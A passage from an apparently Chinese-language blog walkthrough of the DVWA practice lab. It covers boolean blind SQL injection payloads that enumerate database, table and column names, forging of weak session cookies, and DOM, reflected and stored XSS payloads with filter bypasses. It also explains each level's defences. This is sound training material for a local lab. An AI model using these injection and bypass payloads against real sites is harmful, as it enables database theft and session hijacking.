+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length(database())=4;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="获取数据库名称-2"   >
+          <a href="#获取数据库名称-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-2" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="获取数据库表名-4"   >
+          <a href="#获取数据库表名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-4" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
+      
+        <h5 id="获取表的数量-2"   >
+          <a href="#获取表的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-2" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(table_name) from information_schema.tables where table_schema=database()) =2;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="分别获取两个表的表名长度-2"   >
+          <a href="#分别获取两个表的表名长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-2" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9;#</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第二个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="分别获取两个表的表名-2"   >
+          <a href="#分别获取两个表的表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-2" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第一个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;#</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第二个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117;#</span><br></pre></td></tr></table></div></figure>
+
+<p>最终获得表名依次为guestbook，users</p>
+
+        <h4 id="获取字段名-4"   >
+          <a href="#获取字段名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-4" class="headerlink" title="获取字段名"></a>获取字段名</h4>
+      
+        <h5 id="获取users表中字段的数量-2"   >
+          <a href="#获取users表中字段的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-2" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=8;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="获取每个字段的字段长度-2"   >
+          <a href="#获取每个字段的字段长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-2" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段长度</span><br><span class="line">1 and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=7;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="获取字段名-5"   >
+          <a href="#获取字段名-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-5" class="headerlink" title="获取字段名"></a>获取字段名</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段第一个字符</span><br><span class="line">1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=117;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="时间盲注-1"   >
+          <a href="#时间盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3>
+      <p>同Low难度步骤</p>
+<p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221339914.png" alt="image-20240522133946866"></p>
+<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>
+
+        <h2 id="High-7"   >
+          <a href="#High-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-7" class="headerlink" title="High"></a>High</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340011.png" alt="image-20240522134027966"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340132.png" alt="image-20240522134042088"></p>
+<p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221347858.png" alt="image-20240522134746813"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221348596.png" alt="image-20240522134800557"></p>
+<p>利用cookie传递参数id</p>
+<p>添加了LIMIT 1，以此控制只输出一个结果</p>
+<p>当SQL查询结果为空时，会执行函数sleep()，防止基于时间的盲注</p>
+<p>所以只能布尔盲注了，步骤同Low</p>
+
+        <h2 id="Impossible-7"   >
+          <a href="#Impossible-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221351986.png" alt="image-20240522135112922"></p>
+<p>和上面的一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入</p>
+
+        <h6 id="SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html"   >
+          <a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="headerlink" title="SQL盲注：https://www.cnblogs.com/qiushuo/p/17485659.html"></a>SQL盲注：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html" >https://www.cnblogs.com/qiushuo/p/17485659.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
+      
+        <h1 id="九、薄弱的Session-ID"   >
+          <a href="#九、薄弱的Session-ID" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、薄弱的Session-ID" class="headerlink" title="九、薄弱的Session ID"></a>九、薄弱的Session ID</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221357695.png" alt="image-20240522135739640"></p>
+
+        <h2 id="Low-8"   >
+          <a href="#Low-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221358115.png" alt="image-20240522135814073"></p>
+<p>首先检查会话变量 <code>$_SESSION[&#39;last_session_id&#39;]</code> 是否已设置，如果未设置，将其初始化为 0，然后，每次 POST 请求时，这个变量的值都会递增，容易被伪造</p>
+<p>可以看到，点一下按钮dvwaSession的值就会+1</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221402921.png" alt="image-20240522140226878"></p>
+<p>可以利用一下，将原网页的cookie复制下来</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221427296.png" alt="image-20240522142750240"></p>
+<p>打开一个新网页访问</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/vulnerabilities/weak_id/" >http://127.0.0.1:4280/vulnerabilities/weak_id/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>同时抓包，然后修改里面的cookie为原网页的值，发送之后看到已经登录进来了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221426548.png" alt="image-20240522142630479"></p>
+<p>HackBar也行</p>
+
+        <h2 id="Medium-8"   >
+          <a href="#Medium-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221437399.png" alt="image-20240522143740355"></p>
+<p>Cookie 的值基于当前的 Unix 时间戳，<code>time()</code> 函数返回当前的 Unix 时间戳，即从1970年1月1日 00:00:00到当前时间的秒数</p>
+<p>所以修改cookie时将dvwaSeesion的值改成当前的时间戳即可</p>
+
+        <h2 id="High-8"   >
+          <a href="#High-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-8" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221443734.png" alt="image-20240522144304673"></p>
+<p>使用 MD5 哈希函数将值转换为哈希字符串</p>
+<p>设置 Cookie 的过期时间为当前时间之后的 3600 秒</p>
+<p>指定 Cookie 有效的路径，只有在此路径及其子路径下的页面才能访问该 Cookie</p>
+<p>设置 Cookie 的域名为当前请求的域名</p>
+<p>抓包看看cookie，看到响应里的cookie已经发生了变化</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241346928.png" alt="image-20240524134609867"></p>
+<p>将响应里的cookie拿去md5解密，发现值为8，再响应一次解密值为9，由此可见cookie也是逐渐递增的，所以可以修改为md5加密数字后的值</p>
+
+        <h2 id="Impossible-8"   >
+          <a href="#Impossible-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221450403.png" alt="image-20240522145047357"></p>
+<p>使用 <code>mt_rand()</code> 生成一个随机数，<code>time()</code> 获取当前的 Unix 时间戳，和字符串 <code>&quot;Impossible&quot;</code> 一起构成了一个唯一的字符串，再使用SHA-1哈希函数将这个字符串转换为哈希字符串</p>
+<p>同样设置了有效时间为一小时和有效路径</p>
+<p><code>true</code>：设置 <code>secure</code> 标志为 <code>true</code>，意味着此 Cookie 只能通过 HTTPS 协议发送，防止通过 HTTP 连接泄露 Cookie 信息</p>
+<p><code>true</code>：设置 <code>httponly</code> 标志为 <code>true</code>，意味着此 Cookie 不能被 JavaScript 访问，这有助于防止XSS盗用 Cookie</p>
+
+        <h1 id="十、XSS（DOM型）"   >
+          <a href="#十、XSS（DOM型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、XSS（DOM型）" class="headerlink" title="十、XSS（DOM型）"></a>十、XSS（DOM型）</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221539191.png" alt="image-20240522153907139"></p>
+<p>随意选择一个后可以看到URL上有参数传入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221541437.png" alt="image-20240522154125388"></p>
+
+        <h2 id="Low-9"   >
+          <a href="#Low-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2>
+      <p>直接在URL上将default的值改为，出现弹窗</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542746.png" alt="image-20240522154222698"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542951.png" alt="image-20240522154247909"></p>
+<p>没有任何防护</p>
+
+        <h2 id="Medium-9"   >
+          <a href="#Medium-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221545935.png" alt="image-20240522154551887"></p>
+<p>检查是否存在default键，并且不为空</p>
+<p>使用 <code>stripos()</code> 函数查找 <code>default</code> 参数值中是否包含 <code>&lt;script</code> 子串，<code>stripos()</code> 是不区分大小写的字符串查找函数，如果找到匹配项则返回TRUE</p>
+<p>如果发现 <code>default</code> 参数包含 <code>&lt;script</code>，则立即重定向用户到同一页面，但将 <code>default</code> 参数设置为 “English”。这样做可以阻断潜在的脚本注入尝试，避免执行恶意脚本</p>
+<p>使用 <code>header()</code> 函数执行 HTTP 重定向。这里使用 <code>location</code> 头进行重定向，是常见的防止恶意输入影响网站行为的手段。</p>
+<p>因此用别的标签</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>但是页面没有出现弹窗</p>
+<p>查看网页源代码发现语句只是被插入到了value值中，但是并没有插入到option标签的值中，那么输入通常会被当做纯文本处理，不会被浏览器执行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221553997.png" alt="image-20240522155350953"></p>
+<p>Low难度的代码插入后网页源代码是这样的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221604723.png" alt="image-20240522160431679"></p>
+<p>尝试提前闭合option标签</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221617977.png" alt="image-20240522161732933"></p>
+<p>再尝试闭合select标签</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>成功出现弹窗</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221618875.png" alt="image-20240522161831835"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221558788.png" alt="image-20240522155848745"></p>
+
+        <h2 id="High-9"   >
+          <a href="#High-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-9" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221619724.png" alt="image-20240522161925673"></p>
+<p>使用白名单模式，如果default值相匹配，则插入case字段的相应值，如果不匹配，则插入的是默认的值所以default的值必须包含这几个之一</p>
+
+        <h3 id="用-amp-连接"   >
+          <a href="#用-amp-连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#用-amp-连接" class="headerlink" title="用&amp;连接"></a>用&amp;连接</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623430.png" alt="image-20240522162307386"></p>
+
+        <h3 id="用"   >
+          <a href="#用" class="heading-link"><i class="fas fa-link"></i></a><a href="#用" class="headerlink" title="用#"></a>用#</h3>
+      <p> URL 中 <code>#</code> 之后的信息不会发送到服务器，它只会在本地（客户端浏览器）中使用</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221627508.png" alt="image-20240522162745466"></p>
+
+        <h2 id="Impossible-9"   >
+          <a href="#Impossible-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623645.png" alt="image-20240522162327607"></p>
+<p>输入代码试试，页面没反应，查看网页源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221630166.png" alt="image-20240522163027127"></p>
+<p>这里对输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签，就不存在XSS漏洞了</p>
+
+        <h1 id="十一、XSS（反射型）"   >
+          <a href="#十一、XSS（反射型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、XSS（反射型）" class="headerlink" title="十一、XSS（反射型）"></a>十一、XSS（反射型）</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211304691.png" alt="image-20240521130457646"></p>
+<p>随便输入一串字符，可以看到界面有变化，URL中也传入了name变量</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211305114.png" alt="image-20240521130534080"></p>
+
+        <h2 id="Low-10"   >
+          <a href="#Low-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2>
+      <p>尝试构造脚本，将<script>alert(/xss/)</script>传入name变量</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211308619.png" alt="image-20240521130826579"></p>
+<p>通过</p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211309067.png" alt="image-20240521130929038"></p>
+<p>只要输入不为空就行</p>
+
+        <h2 id="Medium-10"   >
+          <a href="#Medium-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211311646.png" alt="image-20240521131114609"></p>
+<p>只是过滤了<script></p>
+
+        <h3 id="大小写绕过"   >
+          <a href="#大小写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3>
+      <p>将</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/Script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>传入name变量</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211317739.png" alt="image-20240521131732696"></p>
+
+        <h3 id="双写绕过"   >
+          <a href="#双写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>…</p>
+
+        <h2 id="High-10"   >
+          <a href="#High-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-10" class="headerlink" title="High"></a>High</h2>
+      <p>源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211337925.png" alt="image-20240521133758892"></p>
+<p>过滤任何形式的 <script>标签，即使这些字符被插入其他字符或以不同顺序排列也一样</p>
+<p>那就不用这个标签，利用JavaScript事件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211341785.png" alt="image-20240521134137746"></p>
+
+        <h6 id="XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430"   >
+          <a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="headerlink" title="XSS绕过姿势：https://blog.csdn.net/2301_81504583/article/details/134948430"></a>XSS绕过姿势：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81504583/article/details/134948430" >https://blog.csdn.net/2301_81504583/article/details/134948430</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
+      
+        <h2 id="Impossible-10"   >
+          <a href="#Impossible-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211343718.png" alt="image-20240521134338686"></p>
+<p>多了Token验证，防止CSRF攻击   </p>
+<p>使用 <code>htmlspecialchars</code> 函数转义输入的值，这样做可以防止XSS，该函数会转换特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code> 等）为 HTML 实体，这样它们在浏览器中就不会被当作代码执行</p>
+
+        <h1 id="十二、XSS（存储型）"   >
+          <a href="#十二、XSS（存储型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、XSS（存储型）" class="headerlink" title="十二、XSS（存储型）"></a>十二、XSS（存储型）</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221456806.png" alt="image-20240522145622759"></p>
+
+        <h2 id="Low-11"   >
+          <a href="#Low-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2>
+      <p>Name框任意，Message框内输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>出现弹窗</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221455989.png" alt="image-20240522145524940"></p>
+<p>原界面显示已经存入该条信息，所以不清除数据的话，之后每一次打开这个页面都会有弹窗</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221457945.png" alt="image-20240522145754900"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221459285.png" alt="image-20240522145941225"></p>
+<p>使用 <code>trim()</code> 函数去除输入字符串的前后空白，只是使用了mysqli_real_escape_string来防止SQL注入，而且可以看到上传成功后就会更新数据库</p>
+
+        <h2 id="Medium-11"   >
+          <a href="#Medium-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221509004.png" alt="image-20240522150946951"></p>
+<p><code>strip_tags()</code> 函数移除Message中字符串中的 HTML 和 PHP 标签</p>
+<p><code>htmlspecialchars()</code> 转换Message中特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
+<p> <code>str_replace()</code> 过滤Name框中<code>&lt;script&gt;</code> 标签</p>
+<p>所以，代码可以插入在Name框中，可以按XSS反射型题的绕过方法，Message框随意</p>
+<p>但是尝试之后发现页面的Name框有输入限制，只能用其他工具比如HackBar来传参，用POST传入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;Script&gt;alert(/xss/)&lt;/Script&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>
+
+<p>成功出现弹窗</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241410602.png" alt="image-20240524141056553"></p>
+
+        <h2 id="High-11"   >
+          <a href="#High-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-11" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221523293.png" alt="image-20240522152316234"></p>
+<p>和上一题类似的过滤，Name框也过滤了任何形式的 <script>标签，按上一题型的方法换一个标签，用HackBar传入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241412124.png" alt="image-20240524141202076"></p>
+
+        <h2 id="Impossible-11"   >
+          <a href="#Impossible-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221524697.png" alt="image-20240522152449640"></p>
+<p>使用令牌防止CSRF攻击</p>
+<p>在Name框也过滤了字符串中的 HTML 和 PHP 标签，转换特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
+<p>使用 PDO 预处理语句来插入数据，通过参数绑定来进一步提高安全性</p>
+
+        <h1 id="十三、CSP"   >
+          <a href="#十三、CSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、CSP" class="headerlink" title="十三、CSP"></a>十三、CSP</h1>
+      
+        <h2 id="Low-12"   >
+          <a href="#Low-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221714400.png" alt="image-20240522171405345"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221713230.png" alt="image-20240522171351156"></p>
+<p>可以看到被信任的网站有：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pastebin.com/" >https://pastebin.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> hastebin.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.toptal.com/" >www.toptal.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> example.com code.jquery.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ssl.google-analytics.com/" >https://ssl.google-analytics.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/" >https://digi.ninja</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>试试在框内输入它提示的内容，比如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/dvwa/cookie.js%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%9C%89%E5%BC%B9%E7%AA%97%E6%98%BE%E7%A4%BAcookie" >https://digi.ninja/dvwa/cookie.js，就会有弹窗显示cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221726381.png" alt="image-20240522172655337"></p>
+<p>查看网页源代码，也能看到已经插入进去了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221727414.png" alt="image-20240522172732374"></p>
+
+        <h2 id="Medium-12"   >
+          <a href="#Medium-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221728025.png" alt="image-20240522172809981"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221731556.png" alt="image-20240522173106512"></p>
